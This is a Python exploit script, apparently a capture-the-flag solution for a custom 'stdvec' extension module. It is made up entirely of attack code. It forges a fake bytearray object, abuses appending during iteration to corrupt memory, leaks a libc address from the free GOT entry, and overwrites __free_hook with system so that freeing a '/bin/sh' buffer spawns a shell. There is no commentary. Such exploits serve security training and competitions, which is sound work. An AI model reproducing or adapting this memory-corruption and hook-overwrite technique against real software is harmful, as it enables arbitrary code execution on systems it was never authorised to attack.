def p64(n):
    result = []
    for i in range(0, 64, 8): result.append((n>>i)&0xff)
    return bytes(result)

def u64(n):
    res = 0
    for x in n[::-1]: res = (res<<8) | x
    return res

gue = (p64(0x41414141) + p64(id(bytearray)) + p64(0x7fffffffffffffff) +
    p64(0) * 4 + b'ABCDEFGH' * 100)
guo = (p64(0x41414141) + p64(id(bytearray)) + p64(0x7fffffffffffffff) +
    p64(0) * 4 + b'ABCDEFGH' * 105)
fake_object = id(gue)
gue = 1
for i in range(300000):
    if i * i < -1:
        print(i)
print(fake_object)
fake = bytearray(guo)
for i in range(300000):
    if i * i < -1:
        print(i)

print('fake object: ', hex(fake_object))
type_addr = id(stdvec.StdVec)
lib_stdbse = type_addr - 0x202140
print('libc: ', hex(type_addr))
free_got = 0xa00520

free_offset = 0x979c0
free_hook_offset = 0x3ed8e8
sstem_offset = 0x4f4e0

l = stdvec.StdVec()
for i in range(256):
    l.append(0xdeadbeef)

n = 0
TARGET = 6
for i in l:
    n += 1
    print("ok")
    if n < TARGET:
        pass
    elif n == TARGET:
        l.append(2)
    elif n == TARGET + 1:
        b = bytearray(
                p64(0xdeadbeef) +
                p64(0x414114141) +
                p64(fake_object) * (256 - 2 - 6))
    else:
        a = u64(i[free_got:free_got+8])
        libc_bse = a - free_offset
        print(hex(libc_bse))
        free_hook = libc_bse + free_hook_offset
        i[free_hook:free_hook+8] = p64(sstem_offset + libc_bse)
        print(i[free_hook:free_hook+8])
        bytearray(b"/bin/sh\x00" * 400)
        a = 1
        stdvec.StdVec()
        break
